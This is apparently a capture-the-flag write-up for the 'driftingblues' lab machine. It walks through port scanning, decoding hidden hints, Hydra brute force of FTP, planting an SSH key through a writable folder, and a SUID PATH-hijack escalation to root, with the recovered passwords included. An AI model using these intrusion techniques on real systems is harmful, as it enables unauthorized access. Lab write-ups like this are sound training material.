nmap -sS -sV -T4 -p- 10.0.0.23

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

Going to the site hosted on the webserver on port 80, it says it's under construction.
Using the dev tools we can see a comment.

<!--Z28gYmFjayBpbnRydWRlciEhISBkR2xuYUhRZ2MyVmpkWEpwZEhrZ1pISnBjSEJwYmlCaFUwSnZZak5DYkVsSWJIWmtVMlI1V2xOQ2FHSnBRbXhpV0VKellqTnNiRnBUUWsxTmJYZ3dWMjAxVjJGdFJYbGlTRlpoVFdwR2IxZHJUVEZOUjFaSlZWUXdQUT09-->
It looks base64 encoded:

Base64 decode:
{
go back intruder!!! dGlnaHQgc2VjdXJpdHkgZHJpcHBpbiBhU0JvYjNCbElIbHZkU2R5WlNCaGJpQmxiWEJzYjNsbFpTQk1NbXgwV201V2FtRXliSFZhTWpGb1drTTFNR1ZJVVQwPQ==
}

Base64 decode:
{
tight security drippin aSBob3BlIHlvdSdyZSBhbiBlbXBsb3llZSBMMmx0Wm5WamEybHVaMjFoWkM1MGVIUT0=
}

Base64 decode:
{
i hope you're an employee L2ltZnVja2luZ21hZC50eHQ=
}

Base64 decode:
/imfuckingmad.txt

Going to http://10.0.0.20/imfuckingmad.txt we get a brainfuck script.

brainfuck execute:

"man we are a tech company and still getting hacked??? what the shit??? enough is enough!!!"

/iTiS3Cr3TbiTCh.png

Going to http://10.0.0.23/iTiS3Cr3TbiTCh.png there is a scannable barcode, scanning it leads to a site with another image. ---> https://imgur.com/a4JjS76
It has a list of users:

possible users:
luther
gary
hubert
clark

We can probebly use this users to brute force FTP or SSH. Trying to log into ssh we are prompted that we need a public key, so we can't brute force ssh.
Trying to log in as the anonymous user on FTP isn't available so brute force it is.

root@kali ~# hydra -L userList.txt -P /usr/share/wordlists/rockyou.txt 10.0.0.20 ftp -I -t4 -uVf

And we have 2 logins:

luther:mypics

hubert:john316

Loggin as luther to the ftp server, there a is a directory named hubert.

drwxrwxrwx   3 1001     1001         4096 Jan 18 16:40 hubert
-rw-r--r--   1 root     root           50 Jan 18 18:03 sync_log 

This is the home folder for the hurbert user on the machine. Going back to when we tried to brute force ssh, we were prompted that have to login in with a public key, that means the machine we want to connect to has to have our public key.
So we need to add our to the hurbert folder to log in to his user via ssh.
After creating a key on our local machine and putting in the authorized_key file, we can make the directory ".ssh" in the hubert directory and put the authorized_key file in there.

root@kali ~# ssh hubert@10.0.0.23 -i ~/.ssh/id_rsa
Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan 18 10:43:04 2022 from 10.0.0.27
hubert@driftingblues:~$ 


We are logged in as the "hurbert" user and we can read the first flag.
user.txt:
flag 1/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

Let's try to find files with SUID permissions to get a root shell.

hubert@driftingblues:~$ find / -perm /4000 2> /dev/null

There the file /usr/bin/getinfo, after executing it seems to output some commands to get info about the machine, one of the commands is "ip a" to get the ip address of the machine.
We can make another file named ip and have it open a new shell and change the PATH variable to be in the directory the fake ip file is.

hubert@driftingblues:~$ cat ip
#!/bin/bash

/bin/bash

hubert@driftingblues:~$ export PATH=/home/hubert
hubert@driftingblues:~$ echo $PATH
/home/hubert

hubert@driftingblues:~$ /usr/bin/getinfo
###################
ip address
###################

root@driftingblues:~# 

And we a root shell, we can change the PATH variable to /usr/bin to run commands again and read the final flag.
root.txt:
flag 2/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!


